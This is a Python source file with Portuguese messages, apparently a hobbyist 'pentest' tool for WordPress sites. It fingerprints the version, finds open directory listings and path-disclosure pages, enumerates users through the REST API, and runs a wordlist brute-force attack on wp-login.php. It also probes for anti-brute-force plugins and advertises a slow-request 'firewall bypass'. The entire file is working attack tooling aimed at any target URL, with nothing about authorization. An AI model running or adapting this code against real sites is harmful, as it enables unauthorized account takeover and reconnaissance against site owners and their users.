try: import requests as r
except: print("Instale o requests! (sudo pip3 install requests)") ; exit()
try: import json
except: print("Instale o json! (sudo pip3 install json)") ; exit()
try: import argparse as  arg 
except: print("Instale o argparse! (sudo pip3 install argparse)") ; exit()
import os,sys,time, re
os.system("cls" if os.name == "nt" else "reset")

index = """

 ÛÛÛÛÛÛÛÛÛÛÛ                             ÛÛÛ      ÛÛÛÛÛ                      ÛÛÛÛÛÛÛÛÛ 
°°ÛÛÛ°°°°°ÛÛÛ                           °°°      °°ÛÛÛ                      ÛÛÛ°°°°°ÛÛÛ
 °ÛÛÛ    °ÛÛÛ  ÛÛÛÛÛÛ   ÛÛÛÛÛ   ÛÛÛÛÛÛ  ÛÛÛÛ   ÛÛÛÛÛÛÛ   ÛÛÛÛÛÛ  ÛÛÛÛÛÛÛÛ  °ÛÛÛ    °°° 
 °ÛÛÛÛÛÛÛÛÛÛ  ÛÛÛ°°ÛÛÛ ÛÛÛ°°   ÛÛÛ°°ÛÛÛ°°ÛÛÛ  ÛÛÛ°°ÛÛÛ  ÛÛÛ°°ÛÛÛ°°ÛÛÛ°°ÛÛÛ °°ÛÛÛÛÛÛÛÛÛ 
 °ÛÛÛ°°°°°°  °ÛÛÛ °ÛÛÛ°°ÛÛÛÛÛ °ÛÛÛÛÛÛÛ  °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ  °°°°°°°°ÛÛÛ
 °ÛÛÛ        °ÛÛÛ °ÛÛÛ °°°°ÛÛÛ°ÛÛÛ°°°   °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ °ÛÛÛ  ÛÛÛ    °ÛÛÛ
 ÛÛÛÛÛ       °°ÛÛÛÛÛÛ  ÛÛÛÛÛÛ °°ÛÛÛÛÛÛ  ÛÛÛÛÛ°°ÛÛÛÛÛÛÛÛ°°ÛÛÛÛÛÛ  ÛÛÛÛ ÛÛÛÛÛ°°ÛÛÛÛÛÛÛÛÛ  v2
°°°°°         °°°°°°  °°°°°°   °°°°°°  °°°°°  °°°°°°°°  °°°°°°  °°°° °°°°°  °°°°°°°°°  

	* Ferramenta básica para pentest em sites Wordpress.
	* Criado por Supr3m0 (Yunkers Crew)
	* Facebook: www.facebook.com/yunkers01/
"""
manual = """
	--url (-u)            Site alvo (--url localhost)
	--requisicoes (-r)    Tempo para cada requisição (--requisicoes 10)

	--firewall-bypass     Burla o firewall no ataque de brute force, porém será lento!!! (--firewall-bypass)
	--random-agent        Muda o "user-agent" a cada requisição (Ajuda a burlar o firewall)
	--no-clear            Não limpa o terminal/cmd quando for fazer o ataque de brute force (--no-clear)
	--usuario (-us)       Usuário que será usado no brute force (--usuario admin)
	--wordlist (-w)       Wordlist que será usada no brute force (--wordlist w.txt)
	--login-page          Página de login que será feito o ataque de brute force, padrão = wp-login.php (--login-page admin.php)
	--post-user           (AVANÇADO) Parametro que será enviado o usuário no modo POST, padrão = log (--post-user username)
	--post-pass           (AVANÇADO) Parametro que será enviado a senha  no modo POST, padrão = pwd (--post-pass password)

	--no-robots           Não checa os robots (--no-robots)
	--no-infohost         Não checa as informações do host (--no-infohost)
	--no-arquivos         Não checa os arquivos desprotegidos (--no-arquivos)
	--no-fpd              Não checa se contém falha 'FPD' no site (--no-fpd)

	--enumerar (-E)       Enumerar usuários do site (--enumerar)
	--enumerar-p (-EP)    Enumerar plugins do site fazendo brute force de diretórios (-EP)

Use: python3 {} -u http://SITE/
OBS: Para o programa entender que você quer fazer o ataque de brute force, insira o parametro "--usuario" e o parametro "--wordlist".
""".format(sys.argv[0])
parser = arg.ArgumentParser()
parser.add_argument("--url","-u", action='store')
parser.add_argument("--usuario", "-us", action='store')
parser.add_argument("--wordlist", "-w", action='store')
parser.add_argument("--requisicoes", "-r", action='store', type=int, default=10)
parser.add_argument("--firewall-bypass", "-FB", action='store_true')
parser.add_argument("--enumerar", "-E", action='store_true')
parser.add_argument("--no-robots", action='store_true')
parser.add_argument("--no-infohost", action='store_true')
parser.add_argument("--no-arquivos", action='store_true')
parser.add_argument("--no-fpd", action='store_true')
parser.add_argument("--no-clear", action='store_true')
parser.add_argument("--login-page", action='store', default="wp-login.php")
parser.add_argument("--post-user", action='store', default="log")
parser.add_argument("--post-pass", action='store', default="pwd")
param = parser.parse_args()

if len(sys.argv) == 1:
	print(index) ; print(manual) ; exit()
if not param.url: print(index) ; print("[x] Insira uma URL!") ;  exit()
print(index)
user_agent = {"user-agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36"}
def arruma(url):
	if url[-1] != "/":
		url = url + "/"
	if url[:7] != "http://" and url[:8] != "https://":
		url = "http://" + url
	return url

url = arruma(param.url)


def inicio():
	verifica_wp()
	print("[+] Site: {}\n".format(url))
	sys.stdout.write("[*] Verificando conexão: ")
	sys.stdout.flush()
	try: 
		checa = r.get(url, headers=user_agent, timeout = param.requisicoes)
		if checa.status_code == 200: sys.stdout.write("conectado!") ; sys.stdout.flush()
		else: sys.stdout.write("não consegui me conectar.") ; sys.stdout.flush() ; exit()
	except Exception as erro: print("\n[x] Ocorreu um erro ao fazer a requisição: {}".format(erro)) ; exit()
	versao_wp()

	if not param.no_robots: wp_robots()
	else: sys.stdout.write("") ; sys.stdout.flush()
	if not param.no_infohost: captura_info_host()
	else: sys.stdout.write("") ; sys.stdout.flush()
	if not param.no_arquivos: diretorios_desprotegidos()
	else: sys.stdout.write("") ; sys.stdout.flush()
	if not param.no_fpd: verifica_fpd()
	else: sys.stdout.write("") ; sys.stdout.flush()
	if param.enumerar: enumerar()
	if param.usuario and param.wordlist: verifica_brute_force()

def versao_wp():
	sys.stdout.write("\n[*] Detectando versão do Wordpress: ") ; sys.stdout.flush()
	html = r.get(url).text
	v1 = re.search(r"content=(\')?(\")( )?WordPress \w+(\.\w+)?(\.\w)?(\.\w)?", html)
	if v1: sys.stdout.write(v1.group()[9:]) ; sys.stdout.flush()
	else: 
		try: 
			readme = r.get(url+"readme.html", headers=user_agent, timeout=param.requisicoes)
			if readme.status_code == 200:
				readme = readme.text.encode("utf-8")
				v2 = re.search(r"Ver(são)?(sÃo)?(sion)? \w+(\.\w+)?(\.\w+)?(\.\w+)?(\.\w+)?", readme)
				if v2: sys.stdout.write(v2.group()) ; sys.stdout.flush()
				else: sys.stdout.write("Erro ao detectar versão do Wordpress.") ; sys.stdout.flush() 
			else: sys.stdout.write("Erro ao detectar versão do Wordpress.") ; sys.stdout.flush() 
		except Exception as err: sys.stdout.write("Erro ao detectar versão do Wordpress.") ; sys.stdout.flush() 
def wp_robots():
	sys.stdout.write("\n[*] Verificando se existe o arquivo 'robots.txt': ") ; sys.stdout.flush()
	robots = url + "robots.txt"
	try:
		robots = r.get(robots, headers=user_agent, timeout=param.requisicoes)
		if robots.status_code == 200:
			sys.stdout.write("existe! ({})".format(url+"robots.txt")) ; sys.stdout.flush()
		else:
			sys.stdout.write("arquivo 'robots.txt' não existe!") ; sys.stdout.flush()
	except Exception as err: sys.stdout.write("arquivo 'robots.txt' não existe!") ; sys.stdout.flush()
def captura_info_host():
	sys.stdout.write("\n\n[*] Capturando informações do host")
	try: req = r.get(url, headers=user_agent, timeout=param.requisicoes).headers
	except Exception as erro: sys.stdout.write(" erro!") ; sys.stdout.flush()

	num = 0 
	info_ = []
	for x in range(3):
		time.sleep(0.5)
		sys.stdout.write(".") ; sys.stdout.flush()
		num += 1
		try:
			if num == 1:
				if req["server"]: info_.append("Servidor: " + req["server"])
			elif num == 2:
				if req["powered-by"]: info_.append("Software: " + req["x-powered-by"])
			elif num == 3:
				if req["link"] and url in req["link"] and "wp-json" in req["link"]:
					info_.append("Wordpress rodando REST API!")
		except: continue
		if num == 3:
			sys.stdout.write("pronto!\n") ; sys.stdout.flush()
			for y in info_:
				print("    {}".format(y))
			break
def diretorios_desprotegidos():
	sys.stdout.write("\n[*] Verificando diretórios desprotegidos") ; sys.stdout.flush()
	unprotect = ["wp-content/", "wp-includes/", "wp-content/uploads/", "wp-content/plugins/", "wp-content/themes/", "readme.html", "wp-content/files/", "wp-includes/js/", "wp-includes/css/", "wp-includes/rss/"]
	unpro_x = []
	for x in unprotect:
		try:
			sys.stdout.write(".") ; sys.stdout.flush()
			url_usar = url + x
			req = r.get(url_usar, headers=user_agent, timeout=param.requisicoes)
			if req.status_code == 200 and "Index of" in req.text:
				unpro_x.append(url_usar)
		except Exception as err: print("\nOcorreu um erro: {}".format(err)) ; exit()
	sys.stdout.write("pronto!") ; sys.stdout.flush()
	if len(unpro_x) == 0:
		sys.stdout.write("\n    [x] Nenhum diretório desprotegido!") ; sys.stdout.flush()
	else:
		sys.stdout.write("\n    [*] Total de diretórios desprotegidos: {}, listando".format(str(len(unpro_x)))) ; sys.stdout.flush()
		for x in range(3):
			time.sleep(0.3)
			sys.stdout.write(".") ; sys.stdout.flush()
		print()
		for si in unpro_x:
			print("        {}".format(si))
def verifica_fpd():
	full_fpd = ["wp-includes/ms-settings.php", "wp-includes/rss-functions.php", "wp-includes/rss.php", "wp-includes/template-loader.php", "wp-includes/wp-db.php"]
	fpd_ok = []
	sys.stdout.write("\n\n[*] Verificando se o site é vulnerável a FPD") ; sys.stdout.flush()
	for x in full_fpd:
		sys.stdout.write(".") ; sys.stdout.flush()
		req = r.get(url+x, headers=user_agent, timeout=param.requisicoes)
		if req.status_code == 200 and "Warning" in req.text:
			fpd_ok.append(url+x)
	sys.stdout.write("pronto!") ; sys.stdout.flush()
	if len(fpd_ok) == 0:
		sys.stdout.write("\n    [x] Não vulneravel a FPD!") ; sys.stdout.flush()
	else:
		sys.stdout.write("\n    [*] Site vulnerável a FPD, listando diretórios") ; sys.stdout.flush()
		for x in range(3):
			time.sleep(0.3)
			sys.stdout.write(".") ; sys.stdout.flush()
		print()
		for x in fpd_ok:
			print("        {}".format(x))
def verifica_brute_force():
	if param.usuario and param.wordlist:
		sys.stdout.write("\n\n[*] Verificando se existe algum plugin contra brute force") ; sys.stdout.flush()
		plugins = ["wp-content/plugins/bruteprotect/", "wp-content/plugins/login-lockdown/", "/wp-content/plugins/wordfence/"]
		blacklist = []
		for x in plugins:
			try:
				sys.stdout.write(".") ; sys.stdout.flush()
				req = r.get(url+x, headers=user_agent, timeout=param.requisicoes)
				if req.status_code != 404:
					blacklist.append(url+x)
			except Exception as err: print("\nOcorreu um erro: {}".format(err)) ; exit()
		if len(blacklist) != 0:
			print("    [x] Existe plugins de segurança contra o ataque de brute force.")
		else:
			sys.stdout.write("\n    [*] Carregando componentes") ; sys.stdout.flush()
			for x in range(3):
				time.sleep(0.3)
				sys.stdout.write(".") ; sys.stdout.flush()
			if not param.no_clear:
				os.system("cls" if os.name == "nt" else "reset")
			else:
				sys.stdout.write("\n\n\n") ; sys.stdout.flush()
			ataque_bf()
	else:
		sys.stdout.write("\n\n[x] Erro ao iniciar o ataque de brute force! (Insira um usuario e uma wordlist)") ; sys.stdout.flush() ; exit()
def ataque_bf():
	num = 0
	wordlist = open(param.wordlist, "r").readlines()
	wordlist = [x.replace("\n", "") for x in wordlist]
	sys.stdout.write("[*] Verificando conexão com o diretório {}: ".format(param.login_page)) ; sys.stdout.flush()
	try: 
		checa = r.get(url+param.login_page, headers=user_agent, timeout=param.requisicoes).status_code
		if checa == 200: sys.stdout.write("conectado!") ; sys.stdout.flush()
		else: sys.stdout.write("erro!!") ; sys.stdout.flush() ; exit()
	except Exception as err: print("\nOcorreu um erro: {}".format(err)) ; exit()
	print("\n\n[+] Wordlist: {} (Total de senhas: {})\n[+] Usuário: {}\n[+] Página de login: {}\n\n[#] Ataque iniciado!".format(param.wordlist, str(len(wordlist)), param.usuario, param.login_page))
	for linha in wordlist:
		num +=1
		if param.firewall_bypass: time.sleep(0.5)
		else: time.sleep(0.2)
		payload = {param.post_user :  param.usuario, 
				   param.post_pass :  linha}
		url_usar = url + param.login_page
		envia = r.post(url_usar, data=payload, headers=user_agent, timeout=param.requisicoes)
		if  not "?action=lostpassword" in envia.text:
			sys.stdout.write("\r\nSenha Quebrada!!!\n Login: {} / Senha: {} / Página de Login: {}".format(param.usuario, linha, url_usar))
			input("\nAperte 'Enter' para fechar.")
			exit()
		else:
			print("[x] Senha incorreta: {} {}/{}".format(linha, num, str(len(wordlist))))
def enumerar():
	enum = url + "wp-json/wp/v2/users/"
	try:
		checa = r.get(enum, headers=user_agent, timeout=param.requisicoes)
		if checa.status_code == 200 and "id" in checa.text:
			sys.stdout.write("\n\n[*] Enumerando usuários") ; sys.stdout.flush()
			for i in range(3):
				time.sleep(0.3)
				sys.stdout.write(".") ; sys.stdout.flush()
			print()
			usuarios = json.loads(checa.text)
			for usuario in usuarios:
				usu = usuario["slug"].replace("-", ".")
				print("    Usuario: {}".format(usu))
				print("    ID: {}".format(usuario["id"]))
				print("    Nome: {}".format(usuario["name"]))
				print("    Rede Social: {}".format(usuario["url"]))
				print()
		else:
			sys.stdout.write("\n\n[x] Impossivel enumerar usuários") ; sys.stdout.flush
	except Exception as err: print("\nOcorreu algum erro: {}".format(err)) ; exit()

def verifica_wp():
	try:
		dirs = ["wp-content/", "wp-includes/", "wp-content/plugins/", "wp-login.php", "wp-content/uploads/", "wp-content/themes/", "fail"]
		yx = r.get(url).text
		if not "wp-content" in yx:
			num = 0
			for x in dirs:
				try:
					num +1
					url2 = url + x
					checa = r.get(url2, headers=user_agent, timeout=param.requisicoes).status_code
					if checa != 404: 
						break
				except Exception as err:
					print("\n[x] Site não roda o CMS Wordpress.",err) ; exit()
			if num == len(dirs):
				print("\n[x] Site não toda o CMS Wordpress.") ; exit()
	except Exception as err: print("\nOcorreu algum erro: {}".format(err)) ; exit()
def enumerar_usuarios():
	pass
if __name__ == "__main__":
	try: inicio() ; print("\n\n[+] Finalizado!") ; exit()
	except KeyboardInterrupt: exit("\n")
